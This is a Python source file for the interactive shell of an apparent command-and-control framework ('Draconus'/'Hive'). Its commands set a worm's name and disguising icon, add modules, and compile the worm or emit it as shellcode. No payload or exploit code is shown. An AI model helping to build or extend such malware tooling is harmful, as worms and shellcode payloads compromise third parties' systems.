import click
import os
from click_shell import shell
from termcolor import cprint


class QueenShell:
    def __init__(self, main_shell: object, commander: object):
        self.C2 = commander
        self.Queen = self.C2.Queen
        self.main_shell = main_shell

        self.pSort = self.main_shell.msg_sorter.sort_Text
        self.pTitle = self.main_shell.msg_sorter.make_Title
        self.pSort_set = self.main_shell.msg_sorter.set_text_len_first
        self.pSort_restore = self.main_shell.msg_sorter.restore_text_len_first
        self.pError = self.main_shell.msg_sorter.message_error
        self.sHelp = self.main_shell.help

        self.enter_first_time = True

    
    def exitHiveShell(self, *args, **kwargs) -> None:
        cprint("Exit Hive Shell", "yellow")
    
    def enterShell(self) -> None:
        if self.enter_first_time:
            self.Queen.enter()
            self.enter_first_time = False
    

    def shellBuild(self) -> object:

        @shell(prompt=f"[Queen] >>", intro="------ Welcome To Hive ! Put help for commands list ------- ", on_finished=self.exitHiveShell)
        def hiveShell() -> None:
            self.enterShell()
        
        @hiveShell.command()
        def help() -> None:
            self.pTitle("  Hive Help  ")
            self.pSort("clr, clear", "Clear screen.")
            self.pSort("exit", "Exit Hive Shell.")
            self.pSort("reset", "Clear Worm Constructor. Start Empty Template")
            self.pSort("name [new_name]", f"Set worm name. Actual {self.Queen.wormName}")
            self.pSort("icon [-option]", "Set icon to worm. See 'icon --help'")
            self.pSort("mods", "Show Draconus items in library.")
            self.pSort("show [type]", "Display all 'types' items in Library. Ex: 'show worm', 'show module'")
            self.pSort("add [type] [name]", "Adds the selected module type to the worm. Ex: 'add module RawTcp', 'add worm Montezuma'")
            self.pSort('var [-option] [name] "[value]"', "Add, set variable to worm. See 'var --help'")
            self.pSort("worm", "Show worm config. All loaded Modules, Variables etc.")
            self.pSort("build [-option]", "Build, compile worm. See 'build --help' ")
            self.pSort("scan", "Rescan the library, looking for new modules.")


            print("\n")
            self.pSort_restore()
        ######################################################################################################################################

        @hiveShell.command()
        def clr() -> None:
            os.system("clear")
        ######################################################################################################################################

        @hiveShell.command()
        def clear() -> None:
            os.system("clear")
        ######################################################################################################################################

        @hiveShell.command()
        def reset() -> None:
            self.Queen.wormReset()
        ######################################################################################################################################

        @hiveShell.command()
        @click.argument("worm_name")
        def name(worm_name) -> None:
            """Set name for worm."""
            self.Queen.setWormName(worm_name)
        ######################################################################################################################################

        @hiveShell.command()
        @click.option("--help", "show_help", required=False, is_flag=True, help="Show help.")
        @click.option("--set_icon", "-s", required=False, help="Set icon to worm. Ex: 'icon -s rad1.ico")
        @click.option("--list", "icon_list", "-l", required=False, is_flag=True, help="Show icons list.")
        def icon(show_help, set_icon, icon_list) -> None:
            if show_help:
                self.sHelp.HIVE_ICON_HELP
                return
            if set_icon:
                self.Queen.addWormIcon(set_icon)
                return
            if icon_list:
                self.Queen.showIconList()
        ######################################################################################################################################

        @hiveShell.command()
        @click.argument("item_type")
        def show(item_type):
            self.Queen.showItems(item_type)
        ######################################################################################################################################

        @hiveShell.command()
        @click.argument("types")
        @click.argument("name")
        def add(types, name) -> None:
            self.Queen.addWormItem(types, name)
        ######################################################################################################################################    

        @hiveShell.command(context_settings=dict(ignore_unknown_options=True))
        @click.argument("name", required=False)
        @click.argument("value", required=False)
        @click.option("--food", "-f", required=False, is_flag=True, help="Add Food to variable. Ex: 'var -f [var_name] [food_name]")
        @click.option("--types", "-t", required=False, help="Set type of variable. Ex: str, int, list etc.")
        @click.option("--help", "show_help", required=False, is_flag=True, help="Show help.")
        def var(name, value, food, types, show_help) -> None:
            if show_help:
                self.sHelp.HIVE_VARIABLES_HELP
                return
            if not name or not value:
                self.pError("ERROR: name and value is required.")
                return
            if food:
                self.Queen.addFoodAsVar(name, value)
                return
            if types:
                self.Queen.setVariable(name, value, types)
            else:
                self.Queen.setVariable(name, value)

        ######################################################################################################################################
        
        @hiveShell.command()
        def worm() -> None:
            self.Queen.wormShow()
        
        ######################################################################################################################################
        
        @hiveShell.command()
        @click.option("--no_compile", "-nc", required=False, is_flag=True, help="It does not perform compilation. It only creates a code file.")
        @click.option("--payload", "-p", required=False, help="Build your worm as payload. Put ready module to library.")
        @click.option("--shellpay", "-sp", required=False, help="Saves the finished shellcode into the 'payload' section.")
        @click.option("--shellfood", "-sf", required=False, help="Saves the finished shellcode into the 'food' section.")
        @click.option("--help", "-h", "show_help", required=False, is_flag=True, help="Show help.")
        def build(no_compile, payload, shellpay, shellfood, show_help) -> None:
            if show_help:
                self.sHelp.HIVE_BUILD_COMPILE_HELP
                return
            opt = {}
            if no_compile:
                opt["FLAG_NO_COMPILE"] = True
            if payload:
                opt["BUILD_PAYLOAD"] = True
                opt["MODULE_INFO"] = payload
            if shellpay:
                opt["BUILD_SHELLCODE_PAYLOAD"] = True
                opt["MODULE_INFO"] = shellpay
            if shellfood:
                opt["BUILD_SHELLCODE_FOOD"] = True
                opt["MODULE_INFO"] = shellfood

            self.Queen.buildWorm(options=opt)

        ######################################################################################################################################

        @hiveShell.command()
        def scan() -> None:
            self.Queen.scanItems()

        ######################################################################################################################################

        @hiveShell.command()
        def mods() -> None:
            self.sHelp.HIVE_MODULES_TYPE
        ######################################################################################################################################


        ######################################################################################################################################
        return hiveShell
    
    def Start(self) -> None:
        hshell = self.shellBuild()
        hshell()